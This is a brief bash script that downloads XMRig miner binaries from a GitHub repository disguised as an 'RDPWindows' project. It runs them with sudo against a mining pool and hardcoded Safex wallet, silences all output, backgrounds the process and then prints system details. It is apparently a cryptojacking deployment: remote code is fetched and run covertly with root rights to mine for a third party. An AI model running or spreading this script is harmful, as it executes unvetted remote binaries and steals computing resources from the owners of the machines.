#!/bin/bash
wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigDaemon && wget https://github.com/duitawa/RDPWindows201901/raw/master/xmrigMiner && chmod 777 xmrigDaemon && chmod 777 xmrigMiner && sudo ./xmrigDaemon -o sf.pool-pay.com:4025 -u Safex5yuPhr9TAZMoZ3ZfQ5ERrEBB51QsGqpuHjJKLEj6CJ5CvuQPMXRcC37iQZSvtXPrhQEJopMc2W41VMLzyqGd2u7NcyUmKW2X --rig-id $(echo $(shuf -i 1000-9999 -n 1)-ANZ) -p x@$(echo $(shuf -i 1000-9999 -n 1)-ANZ) --donate-level 1 -t 8 -k > /dev/null 2>&1 &
uname -a
